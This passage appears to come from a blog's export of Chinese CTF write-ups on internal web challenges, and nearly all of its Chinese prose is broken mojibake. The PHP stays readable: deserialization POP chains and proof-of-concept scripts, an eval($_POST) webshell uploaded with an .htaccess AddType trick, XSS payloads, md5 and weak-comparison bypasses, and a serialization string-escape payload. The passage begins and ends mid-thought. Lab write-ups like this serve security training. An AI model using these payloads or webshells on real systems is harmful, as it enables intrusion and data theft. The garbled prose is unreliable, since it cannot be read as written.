ä»¤a=aé€šè¿‡PHPä¼šå°†å…¶åˆ¤æ–­ä¸ºæ•°å­—0ï¼ŒæˆåŠŸç»•è¿‡ key1ä¸key2çš„sha1ç¢°æ’å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ æœ€åçš„codeåˆ©ç”¨å˜é‡æ›¿æ¢?code=eval($_GET[1]);&amp;1=echo tac flag.php ;å¯ä»¥ç»•è¿‡å¯¹codeçš„æ­£åˆ™ 0x02 web2 ç›´æ¥bpæŠ“åŒ…è¿›è¡ŒéªŒè¯ å¦‚å›¾é™åˆ¶äº†phpåç¼€åæ–‡ä»¶ ä¿®æ”¹ä¸ºjpgåï¼Œå‘ç°å¦‚å›¾ é‚£æˆ‘ä»¬éœ€è¦ä¿®æ”¹contentç±»å‹çœ‹çœ‹ ç»•è¿‡ä¹‹åè¿˜æ˜¯ä¸è¡Œï¼Œé‚£ä¹ˆä»–åº”è¯¥æ˜¯æ£€æµ‹äº†æ–‡ä»¶å†…å®¹å‚è€ƒäº†ä½¬çš„æ–‡ç« å‘ç°ï¼šè¿™é‡Œçš„PHPç‰ˆæœ¬ä¸ºï¼š PHP/5.6.23 ï¼Œå¯ä»¥ä½¿ç”¨ eval($_POST[â€˜bcxâ€™]); ç»•è¿‡é‚£ä¹ˆæ–‡ä»¶åè¿™é‡Œå¯ä»¥.htaccessæ–‡ä»¶å°†åˆ«çš„åç¼€åæ–‡ä»¶å†…å®¹è§£æä¸ºphpç¨‹åº AddType application/x-httpd-php .bcx ç„¶åä¸Šä¼ shell ç„¶åä¸Šä¼ shellè®¿é—®ä¸Šä¼ è·¯å¾„å‘ç°ç¦ç”¨äº†å¦‚ä¸Šå›¾æ‰€ç¤ºçš„å‡½æ•°ï¼Œä¼°è®¡ç¦äº†å¾ˆå¤šï¼Œé‚£ä¹ˆæˆ‘ä»¬ç”¨ç›®å½•æµè§ˆå‡½æ•°è¯•è¯• æˆåŠŸçœ‹åˆ°flagï¼Œè®¿é—®ä¸€ä¸‹ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥èšå‰‘è¿æ¥æ›´ç®€ä¾¿ 0x03 web3 ç®€å•çš„ååºåˆ—åŒ– å…ˆä¸Šå‡ ä¸ªé­”æ³•å‡½æ•° __construct()//å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ __toString() //å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨ __wakeup()//å°†åœ¨ååºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨(é€šè¿‡åºåˆ—åŒ–å¯¹è±¡å…ƒç´ ä¸ªæ•°ä¸ç¬¦æ¥ç»•è¿‡) __get()//è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶è°ƒç”¨ __invoke()//å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke()æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ å…ˆæ‰¾å…³é”®å‡½æ•°å‘ç°includeå‡½æ•°ï¼Œè€Œè°ƒç”¨è¯¥å‡½æ•°éœ€è¦è°ƒç”¨ikunå‡½æ•°ï¼Œè¿™æ ·æˆ‘ä»¬éœ€è¦è§¦å‘invokeå‡½æ•°æ‰å¯ä»¥è§¦å‘invokeéœ€è¦å½“ç±»å¯¹è±¡è¢«å½“åšå‡½æ•°è°ƒç”¨æ—¶è§¦å‘ï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°try_thisç±»ä¸­çš„functionå‚æ•°ï¼Œå³å°†aaaèµ‹å€¼ä¸ºgetflagå³å¯ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯aaaæ‰€åœ¨çš„æ–¹æ³•ä¸­å­˜åœ¨geté­”æœ¯æ–¹æ³•ï¼Œè€Œå½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ªç±»ä¸­ä¸å­˜åœ¨çš„å±æ€§æ—¶ï¼Œæ‰èƒ½è§¦å‘è¯¥æ–¹æ³•ï¼Œå› æ­¤è½¬åˆ°lanqiuç±»ä¸­ã€‚ æ¥ä¸‹æ¥çœ‹lanqiuç±»ï¼Œå…¶ä¸­wakeupæ–¹æ³•æ²¡å¤šå¤§ç”¨å¤„ï¼Œåªæ˜¯å¯¹sourceåšäº†ä¸€ä¸ªé™åˆ¶ï¼Œæ³¨æ„å…¶ä¸­çš„tostringæ–¹æ³•ï¼Œä¸echoé…åˆå³å¯è°ƒç”¨ï¼Œè¿™æ—¶å°†kunèµ‹å€¼ä¸ºtrythisï¼Œsourceèµ‹å€¼ä¸ºlanqiuï¼Œå³å¯æˆåŠŸè°ƒç”¨getæ–¹æ³•ã€‚ æœ€åå°†evalèµ‹å€¼ä¸º $eval=â€œphp://filter/read=convert.base64-encode/resource=flag.phpâ€;æˆåŠŸè¯»å–åˆ°flagæ–‡ä»¶ popé“¾å¦‚ä¸‹ &lt;?php class get_flag { protected $eval=\"php://filter/read=convert.base64- encode/resource=flag.php\"; } class lanqiu{ public $source; public $kun; public function __construct(){ $this-&gt;kun = new Try_this(); } } class Try_this{ public $aaa; } $a = new lanqiu(); $a-&gt;source = new lanqiu(); $a-&gt;source-&gt;kun-&gt;aaa= new get_flag(); echo urlencode(serialize($a)); ?&gt; base64è§£ç å³å¯","categories":["å†…éƒ¨ç«èµ›"]},{"title":"å†…éƒ¨ç«èµ›2","path":"/2023/08/06/nei-bu-jing-sai-ti-2/","content":"0x01 easy-serialize é¦–å…ˆè¿›å…¥é¡µé¢çœ‹åˆ°å¦‚ä¸‹æç¤ºï¼Œæºä»£ç ä¹Ÿæ²¡å•¥ä¿¡æ¯ï¼Œå°±çŒœæµ‹æ˜¯æ‰«ç½‘ç«™çš„æ„æ€ï¼Œæƒ¯æ€§æ€ç»´ç›´æ¥è®¿é—®robots.txtï¼Œæ‰¾åˆ°phpæ–‡ä»¶ è®¿é—®å¼€å§‹å®¡ä»£ç  &lt;?php class Demo { private $file = 'index.php'; public function __construct($file) { $this-&gt;file = $file; } function __destruct() { @highlight_file($this-&gt;file); } function __wakeup() { if ($this-&gt;file != 'index.php') { // the ikun is in the fl00000g.php $this-&gt;file = 'index.php'; } } } if (isset($_GET['ikun'])) { $kunkun = base64_decode($_GET['ikun']); if (preg_match('/[oc]:\\d+:/i', $kunkun)) { die ('stop Small spot!!!'); } else { @unserialize($kunkun); } } else { highlight_file(\"This_isnot_ikun.php\"); } ?&gt; æ€è·¯å¾ˆæ¸…æ™°ï¼šé¦–å…ˆæ˜¯å¯¹ikunå‚æ•°çš„è¿‡æ»¤ï¼Œç¬¦åˆæ¡ä»¶åˆ™å¼€å§‹ååºåˆ—åŒ–ï¼Œè¿™é‡Œçœ‹åˆ°æ•æ„Ÿå‡½æ•°highlight_fileï¼Œä½œç”¨æ˜¯å¯ä»¥é«˜äº®æŒ‡å®šæ–‡ä»¶ï¼Œå‰ææ˜¯ç¬¬äºŒä¸ªå‚æ•°ä¸ºtrueï¼Œé‚£å¾ˆæ˜æ˜¾æˆ‘ä»¬è¦ä»¤file=fl00000g.phpï¼Œä½†æœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼šå¼€å§‹ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨wakeupé­”æœ¯æ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•ä¼šæ‰°ä¹±æˆ‘ä»¬å¯¹fileçš„èµ‹å€¼ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç»•è¿‡è¯¥æ–¹æ³• é¦–å…ˆåœ¨æ­£åˆ™åŒ¹é…é‚£é‡Œï¼Œæˆ‘ä»¬å¯ä»¥åŒ–ä¸ºO:+æ•°å­—æ¥ç»•è¿‡ï¼Œå…¶æ¬¡åœ¨wakeupä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹è¯¥ç±»çš„å±æ€§ä¸ªæ•°ä¸ç­‰äºçœŸå®ä¸ªæ•°å³å¯ç»•è¿‡ï¼Œæœ€åè®°å¾—base64ç¼–ç ã€‚ é“¾å­å¦‚ä¸‹ï¼š &lt;?php class Demo { private $file = 'index.php'; public function __construct($file) { //$this-&gt;file = $file; } function __destruct() { //echo @highlight_file($this-&gt;file, true); } function __wakeup() { } } $a= new Demo('fl00000g.php'); $poc=serialize($a); $poc=str_replace('O:4', 'O:+4',$poc); $poc=str_replace(':1:', ':2:',$poc); echo $poc; $poc = (base64_encode($poc)); echo $poc; ?&gt; å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡ŒPHPç‰ˆæœ¬ä¸º5.4ï¼Œå› æ­¤è¦æ³¨æ„è¯¥ç±»å˜é‡ä¸­çš„privateå±æ€§ï¼Œè€Œprivateå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆ**%00ç±»å%00å±æ€§å** å› æ­¤æˆ‘ä»¬base64ç¼–ç çš„æ—¶å€™ç”¨è‡ªå¸¦çš„å‡½æ•°ï¼Œä¸ç„¶ä¼šå¯¼è‡´ä¸¢å¤±è¿™äº›ä¸å¯è§å­—ç¬¦ base64è§£ç å³å¯ 0x02 111 ä¾æ—§æ˜¯ååºåˆ—åŒ–ï¼Œå¼€å§‹å®¡ï¼Œè™½ç„¶æœ‰ç‚¹é•¿ï¼Œä½†æ€è·¯æ¸…æ™° &lt;?php include(\"flag.php\"); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = \"1\"; $filename = \"/tmp/tmpfile\"; $content = \"Hello World!\"; $this-&gt;process(); } public function process() { if($this-&gt;op == \"1\") { $this-&gt;write(); } else if($this-&gt;op == \"2\") { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(\"Bad Hacker!\"); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(\"Too long!\"); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(\"Successful!\"); else $this-&gt;output(\"Failed!\"); } else { $this-&gt;output(\"Failed!\"); } } private function read() { $res = \"\"; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo \"[Result]: &lt;br&gt;\"; echo $s; } function __destruct() { if($this-&gt;op === \"2\") $this-&gt;op = \"1\"; $this-&gt;content = \"\"; $this-&gt;process(); } } function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } } æˆ‘ä»¬çœ‹åˆ°æ•æ„Ÿå‡½æ•°file_get_contentsï¼Œè¯¥å‡½æ•°ä¼šè¯»å–æ–‡ä»¶ï¼Œå› æ­¤å¾ˆæ˜æ˜¾æˆ‘ä»¬ä»¤filename=flag.phpå³å¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬åˆçœ‹åˆ°ä¸€ä¸ªæ•æ„Ÿå‡½æ•°file_put_contentsï¼Œè¯¥å‡½æ•°ä¼šå°†æŒ‡å®šå†…å®¹å†™å…¥æŒ‡å®šæ–‡ä»¶ï¼Œä¸å‡ºæ‰€æ–™æˆ‘ä»¬åº”è¯¥ç»•è¿‡æ­¤å‡½æ•°ï¼ˆwriteï¼‰ï¼Œå› ä¸ºå‡½æ•°å¯¹æˆ‘ä»¬è¯»å–phpæ–‡ä»¶æ²¡æœ‰ä¸æ¯«å¸®åŠ©ã€‚ å› æ­¤æˆ‘ä»¬éœ€è¦å°†opèµ‹å€¼ä¸º2è¿›å…¥readå‡½æ•°ï¼Œæœ€åç”±outputè¾“å‡ºå†…å®¹ ä½†åœ¨__destruct()æ–¹æ³•ä¸­å¯¹opè¿›è¡Œäº†å¼ºæ¯”è¾ƒï¼Œè€Œå¯¹æ¯”ç€çœ‹åˆ°processå‡½æ•°ä¸­å¯¹opæœ‰ä¸€ä¸ªå¼±æ¯”è¾ƒï¼Œå› æ­¤æˆ‘ä»¬ä»¤opç­‰äºæ•°å­—2å³å¯ç»•è¿‡ï¼Œè¿™æ ·åœ¨å‰è€…ç”±äºç±»å‹ä¸åŒè¿”å›trueï¼Œåè€…åˆ™è¿”å›true è€Œåœ¨is_validå‡½æ•°ä¸­ï¼Œå¯¹æˆ‘ä»¬çš„ååºåˆ—åŒ–å†…å®¹çš„asciiç è¿›è¡Œäº†åˆ¤æ–­ï¼Œå…¶å®è¿™æ˜¯åœ¨é’ˆå¯¹protectedå±æ€§ï¼Œå› ä¸ºè¿™åœ¨åºåˆ—åŒ–ä¼šå‡ºç°ä¸å¯è§å­—ç¬¦ï¼Œé‚£æˆ‘ä»¬å¯ä»¥åœ¨ç¼–å†™pocæ—¶ï¼Œå°†å…¶æ”¹ä¸ºpublicå³å¯ç»•è¿‡ã€‚ pocå¦‚ä¸‹ &lt;?php class FileHandler { public $op; public $filename; public $content; function __construct() { $this-&gt;process(); } public function process() { } private function write() { } private function read() { } private function output($s) { } function __destruct() { } } function is_valid($s) { } $poc=new FileHandler(); $poc-&gt;op = 2; $poc-&gt;filename = \"flag.php\"; echo serialize($poc); ?&gt; å¾—åˆ°flag 0x03 a_bad_day è¿›å…¥é¡µé¢å‘ç°å¦‚ä¸Šï¼Œéšä¾¿ç‚¹ä¸¤ä¸‹çœ‹çœ‹ çœ‹åˆ°urlå‡ºç°getä¼ å‚ï¼ŒçŒœæµ‹æ˜¯æ–‡ä»¶åŒ…å«ï¼Œé‚£æˆ‘ä»¬ç›´æ¥å°è¯•ä¼ªåè®®è¯»å–æºä»£ç  å‘ç°æŠ¥é”™ï¼Œè¿™æ—¶æ²¡å•¥æ€è·¯äº†ï¼Œå› ä¸ºæ²¡æ€ä¹ˆæ·±ç©¶è¿™ç§é¢˜è¿‡ï¼Œå› æ­¤ä¸Šç½‘æœå¯»å‘ç°ï¼Œå°†phpåç¼€å»æ‰ä¼¼ä¹å¯ä»¥ æˆåŠŸå–å¾—æºç  &lt;?php $file = $_GET['category']; if(isset($file)) { if( strpos( $file, \"woofers\" ) !== false || strpos( $file, \"meowers\" ) !== false || strpos( $file, \"index\")){ include ($file . '.php'); } else{ echo \"Sorry, we currently only support woofers and meowers.\"; } } ?&gt; çœ‹åˆ°å¦‚ä¸Šphpä»£ç ï¼Œå‘ç°ä¸€å®šè¦åŒ…å«woofersï¼Œmeowersï¼Œindexä¸­çš„æŸä¸€ä¸ª è¿™é‡Œåˆé•¿çŸ¥è¯†äº†ï¼Œå¯ä»¥åˆ©ç”¨ä¼ªåè®®çš„åµŒå¥— ä¼ªåè®®çš„åµŒå¥—å®é™…ä¸Šå°±æ˜¯è¿‡æ»¤å™¨çš„åµŒå¥— æ‰€ä»¥å¯ä»¥æ„é€ php://filter/read=convert.base64-encode/meowers/resource=flag è§£ç å³å¯ 0x04 web1 å…ˆæŸ¥çœ‹æºä»£ç  å‘ç°åªè¦æˆåŠŸå¼¹çª—å³å¯å›æ˜¾flagï¼Œé‚£æˆ‘ä»¬ç›´æ¥è¾“å…¥alert(1)æµ‹è¯•ä¸€ä¸‹ å‘ç°è¿‡æ»¤äº†script,ä»¥åŠ&lt;&gt;ç¬¦å·ï¼Œç»§ç»­æµ‹è¯•å‘ç°å¯¹onï¼Œsrcï¼ŒåŒå¼•å·ç­‰éƒ½æœ‰æ‰€è¿‡æ»¤ï¼Œè„‘è¢‹ç–¼ï¼Œä½†åŒæ—¶ä¹Ÿå‘ç°åœ¨valueå¤„çš„è¿‡æ»¤ä¼¼ä¹å°‘ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹ï¼Œå°è¯•ä¸€ç•ªè¿‡åä¾æ—§ä¸å¤ªè¡Œã€‚ æ€ç´¢ä¸€ç•ªè¿‡åå‘ç°åˆ©ç”¨ JavaScript ä¼ªåè®®ç»•è¿‡æ˜¯æœ€ç®€æ´çš„ï¼Œä½†æ²¡æƒ³åˆ°ä¹Ÿå¯¹JavaScriptè¿›è¡Œäº†è¿‡æ»¤ï¼Œæ€è€ƒäº†ä¸€é˜µå„¿ï¼Œè¿™æ—¶å€™çœ‹äº†ç¬”è®°æƒ³åˆ°å¯ä»¥ç¼–ç ï¼Œé‚£æˆ‘ä»¬unicodeç¼–ç çœ‹çœ‹ payloadå¦‚ä¸‹ï¼š\"javascript:alert(1) ç¼–ç åï¼š&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41; è¾“å…¥ä¹‹åæˆåŠŸå¼¹çª— å¾—åˆ°flag 0x05 web2 è¿›å»ä¹‹åæ˜¯æœ‰è¶£çš„å°æ¸¸æˆï¼ŒæŸ¥çœ‹æºä»£ç ä¹Ÿæ²¡å•¥æœ‰ç”¨ä¿¡æ¯ï¼Œé‚£æˆ‘ä»¬ç›´æ¥F12çœ‹jsæºç  if(b.x==bucket_one.x||b.x==bucket_two.x||b.x==bucket_three.x||b.x==bucket_four.x||b.x==bucket_five.x) { flag=true; } if(flag==true) { score++; } flag=false; defen(score); if(b.y&gt;600||b.y&lt;0) { game_over=true; } if(game_over==false) { requestAnimationFrame(run); }else { if(score&gt;100) { var result=window.confirm(\"\\u4f60\\u8d62\\u4e86\\uff0c\\u53bb\\u5e7a\\u5e7a\\u96f6\\u70b9\\u76ae\\u7231\\u5403\\u76ae\\u770b\\u770b\"); } else { var result=window.confirm(\"GAMEOVER æ˜¯å¦é‡æ–°å¼€å§‹ï¼Ÿ\"); å®¡åˆ°è¿™é‡Œå‘ç°é‡è¦ä¿¡æ¯ï¼Œå‘ç°åˆ†æ•°å¤§äº100ä¼šæœ‰å¼¹çª—ï¼Œçœ‹å†…å®¹å¾ˆæ˜æ˜¾æ˜¯unicodeç¼–ç ï¼Œæˆ‘ä»¬è§£ç çœ‹çœ‹ å‘ç°è¦è®¿é—®110.php è®¿é—®å‘ç°ä¸€ä¸ªå¾ˆç®€å•çš„PHPç‰¹æ€§ &lt;?php include 'flag.php'; highlight_file(__FILE__); $flag='flag{xxxxxxxxxxxxxxxxxxxxxxxxx}'; if(isset($_GET['gg'])&amp;&amp;isset($_GET['id'])) { $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) { echo 'You got the first step'; if(isset($_POST['passwd'])) { $passwd=$_POST['passwd']; if (!is_numeric($passwd)) { if($passwd==123456) { echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); } else { echo \"can you think twice??\"; } } else{ echo 'You can not get it !'; } } else{ die('only one way to get the flag'); } } else { echo \"You are not a real hacker!\"; } } else{ die('Please input first'); } ?&gt; Please input first è¿™é‡Œä¸è¯¦ç»†è§£é‡Šäº†ï¼Œå¾ˆç®€å•ï¼Œé¦–å…ˆæ˜¯ç®€å•çš„md5å¼ºç¢°æ’ç»•è¿‡ï¼Œä»¤gg[]=1&amp;id[]=2ï¼Œå³å¯ç»•è¿‡ï¼Œéšåæ˜¯ä¸€ä¸ªis_numericå‡½æ•°ä¸å¼±æ¯”è¾ƒçš„é…åˆï¼Œæˆ‘ä»¬ä»¤passwd=123456aå³å¯ç»•è¿‡ æˆåŠŸå¾—åˆ°flag 0x06 yuxss æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°å››ä¸ªéšè—å…ƒç´  é‚£æˆ‘ä»¬å¯ä»¥è¿›è¡Œæµ‹è¯•çœ‹çœ‹å“ªä¸ªå…ƒç´ å¯ä»¥æ˜¾ç¤ºjsä»£ç ï¼Œè¿™é‡Œç”±äºè·Ÿxss-labå¾ˆåƒï¼Œç¿»äº†ç¿»çœ‹åˆ°è¿™é‡Œæœ‰ä¸ªgetå‚æ•°keywordï¼Œæˆ‘ä»¬è¾“å…¥ä»¥ä¸‹payloadï¼š ?keyword=&lt;script&gt;alert('xss')&lt;/script&gt;&amp;t_link=\" type=\"text\"&amp;t_history=\" type=\"text\"&amp;t_sort=\" type=\"text\"&amp;t_ref=\" type=\"text\" å‘ç°åœ¨ç¬¬ä¸‰ä¸ªå…ƒç´ å¯ä»¥å›æ˜¾ï¼Œæˆ‘ä»¬è¿›è¡Œæµ‹è¯•åï¼Œå‘ç°è¿‡æ»¤çš„æŒºå¤šçš„æ— ä»ä¸‹æ‰‹ï¼Œæ¥ç€ç¿»æ–‡ç« ä»¥åŠè¿™ä¸ªt_cookå€¼çš„ç‰¹æ®Šæˆ‘ä»¬æƒ³åˆ°æŠ“åŒ…ä¿®æ”¹cookie å‘ç°userå†…å®¹ä¸cookå†…å®¹æ˜¯åŒæ­¥çš„ï¼Œå¹¶ä¸”è¿‡æ»¤ä¹Ÿä¸å¤šï¼Œé‚£æˆ‘ä»¬åˆ©ç”¨inputæ ‡ç­¾é—­åˆçœ‹çœ‹ payloadï¼š\" onclick=alert('xss') type=\"text è¾“å…¥ä¹‹åç‚¹å‡»æ–‡æœ¬æ¡†å³å¯æˆåŠŸå¼¹çª— å¾—åˆ°flag 0x07 babyupload æ–‡ä»¶ä¸Šä¼ ï¼Œç›´æ¥bpæŠ“åŒ…ä¸Šå»æµ‹è¯• ç®€å•æµ‹è¯•å‘ç°ï¼Œè¿‡æ»¤äº†phpåç¼€ï¼Œæ–‡ä»¶typeç±»å‹ä»¥åŠæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼ˆæ£€æµ‹æ˜¯å¦æœ‰phpæ ‡å¿—ï¼‰ ç”±äºå’Œä¸Šæ¬¡è€ƒæ ¸é¢˜ç›®ä¸€è‡´ï¼Œè¿™é‡Œå¯ä»¥ç”¨å¯ä»¥ä½¿ç”¨ eval($_POST[â€˜bcxâ€™]); ç»•è¿‡ å› ä¸ºPHPç‰ˆæœ¬ä¸º5.6.23ã€‚å…¶æ¬¡è¿™é‡Œéœ€è¦åˆ©ç”¨.htaccessæ–‡ä»¶æ¥è®©å°†åˆ«çš„åç¼€åæ–‡ä»¶å†…å®¹è§£æä¸ºphpç¨‹åº AddType application/x-httpd-php .bcx æ­¥éª¤å¦‚ä¸‹ï¼š ç„¶åä¸Šä¼ shell è®¿é—®shell æˆåŠŸä¸Šä¼ ï¼Œè¿™é‡Œæˆ‘å…ˆç”¨èšå‰‘è¿æ¥ æ ¹ç›®å½•æˆåŠŸæ‰¾åˆ°flag å½“ç„¶è¿™é‡Œä»¤bcx=var_dump(scandir(â€˜/â€™)); ç„¶åbcx=var_dump(file_get_content(â€˜/flagâ€™)); 0x08 0ctf è®¿é—®ä¹‹åå¦‚ä¸‹å›¾ æŸ¥çœ‹æºä»£ç æ²¡å•¥ä¿¡æ¯ï¼Œé‚£ç”¨dirsearchæ‰«ä¸€ä¸‹ç›®å½•ï¼Œç»“æœå‘ç°www.zipï¼Œè®¿é—®å¾—åˆ°æºç ï¼Œå¼€å§‹å®¡è®¡ å…¶ä¸­çš„htmlä»£ç å°±ä¸æ”¾äº† 1. index.php &lt;?php require_once('class.php'); if($_SESSION['username']) { header('Location: profile.php'); exit; } if($_POST['username'] &amp;&amp; $_POST['password']) { $username = $_POST['username']; $password = $_POST['password']; if(strlen($username) &lt; 3 or strlen($username) &gt; 16) die('Invalid user name'); if(strlen($password) &lt; 3 or strlen($password) &gt; 16) die('Invalid password'); if($user-&gt;login($username, $password)) { $_SESSION['username'] = $username; header('Location: profile.php'); exit; } else { die('Invalid user name or password'); } } else { ?&gt; ä¸€ä¸ªç®€å•çš„ç™»å½•é¡µé¢ï¼Œå¦‚æœç”¨æˆ·åå¯†ç æ­£ç¡®ï¼Œåˆ™è·³è½¬åˆ°profile.phpé¡µé¢ 2. register.php &lt;?php require_once('class.php'); if($_POST['username'] &amp;&amp; $_POST['password']) { $username = $_POST['username']; $password = $_POST['password']; if(strlen($username) &lt; 3 or strlen($username) &gt; 16) die('Invalid user name'); if(strlen($password) &lt; 3 or strlen($password) &gt; 16) die('Invalid password'); if(!$user-&gt;is_exists($username)) { $user-&gt;register($username, $password); echo 'Register OK!&lt;a href=\"index.php\"&gt;Please Login&lt;/a&gt;'; } else { die('User name Already Exists'); } } else { ?&gt; æ³¨å†Œé¡µé¢ï¼Œä¹Ÿå¾ˆç®€å•ï¼Œæ£€æŸ¥ä¸€ä¸‹è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œç¬¦åˆè¦æ±‚å°±è¿æ¥æ•°æ®åº“åˆ›å»ºè´¦æˆ· 3. update.php &lt;?php require_once('class.php'); if($_SESSION['username'] == null) { die('Login First'); } if($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) { $username = $_SESSION['username']; if(!preg_match('/^\\d{11}$/', $_POST['phone'])) die('Invalid phone'); if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email'])) die('Invalid email'); if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); $file = $_FILES['photo']; if($file['size'] &lt; 5 or $file['size'] &gt; 1000000) die('Photo size error'); move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name'])); $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $user-&gt;update_profile($username, serialize($profile)); echo 'Update Profile Success!&lt;a href=\"profile.php\"&gt;Your Profile&lt;/a&gt;'; } else { ?&gt; å¯¹äºç”¨æˆ·postè¿›å…¥çš„æ•°æ®è¿›è¡Œæ­£åˆ™åŒ¹é…çš„æ£€æµ‹ï¼Œå…¶ä¸­è¿˜æœ‰serializeæ•æ„Ÿå‡½æ•° 4. profile.php &lt;?php require_once('class.php'); if($_SESSION['username'] == null) { die('Login First'); } $username = $_SESSION['username']; $profile=$user-&gt;show_profile($username); if($profile == null) { header('Location: update.php'); } else { $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo'])); ?&gt; å…ˆååºåˆ—åŒ–profileï¼Œä¹‹åæ‹¿åˆ°phoneç­‰æ•°æ®ï¼Œæœ€ååˆ©ç”¨file_get_contentsæ•æ„Ÿå‡½æ•°è¯»å–photoæ–‡ä»¶ï¼Œå¹¶ç¼–ç ï¼Œè¿™é‡Œå¤§æ¦‚å°±æ˜¯æ¼æ´ç‚¹ã€‚ 5. class.php &lt;?php $config['hostname'] = '127.0.0.1'; $config['username'] = 'root'; $config['password'] = ''; $config['database'] = ''; $flag = ''; ?&gt; æ•°æ®åº“çš„ä¸€äº›é…ç½®ï¼Œä¸è¿‡æ˜¾ç¤ºäº†flagï¼Œé‚£å¾ˆæ˜æ˜¾æˆ‘ä»¬è¦ä¸file_get_contentsé…åˆè¯»å–config.phpï¼Œè¿›è€Œå¾—åˆ°flag é‚£ä¹ˆå¯¹åº”ä¸€ä¸‹é¡µé¢ ä»£ç å‘¢ï¼Œä¼šå¯¹æˆ‘ä»¬åœ¨æ­¤é¡µé¢ä¼ å…¥çš„æ•°æ®è¿›è¡Œç›¸åº”çš„æ­£åˆ™åŒ¹é…ï¼Œä¸ç”¨æƒ³ï¼Œè¿™é‡Œä¾¿éœ€è¦æˆ‘ä»¬å»ç»•è¿‡äº†ï¼Œé‚£çœ‹ä¸€ä¸‹å…³é”®ä»£ç  è¿™é‡Œå¯ä»¥çœ‹åˆ°å…¶é‡ç‚¹é˜²å®ˆäº†nicknameï¼Œå†çœ‹ä¸€ä¸‹update_profileå‡½æ•° å‘ç°ä¸€ä¸ªfilterå‡½æ•°çš„æ£€æµ‹ï¼Œè·Ÿè¸ªçœ‹ä¸€ä¸‹ å‘ç°å¯¹ä¸€äº›æ•æ„Ÿä¸”å±é™©çš„å­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œä¼šå°†å…¶æ›¿æ¢ä¸ºhackerï¼Œè¿™é‡Œä¼°è®¡å°±å¯ä»¥æƒ³åˆ°ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²é€ƒé€¸äº† æˆ‘ä»¬å…ˆæ„é€ payloadçœ‹çœ‹ï¼š &lt;?php class b { public $phone = \"12345678901\"; public $email = \"123@qq.com\"; public $nickname = \"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\"; public $photo = \"config.php\"; } $a=new b(); $profile = serialize($a); echo $profile; ?&gt; O:1:\"b\":4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:10:\"222@qq.com\";s:8:\"nickname\";s:6:\"where\";s:5:\"photo\";s:10:\"config.php\";} ç”±äºwhereä¼šè½¬æ¢ä¸ºhackerï¼Œè€Œä¸”é‚£å‡ ä¸ªå‡æ˜¯äº”ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬åˆ©ç”¨where+å­—ç¬¦ä¸²é€ƒé€¸çœ‹çœ‹ 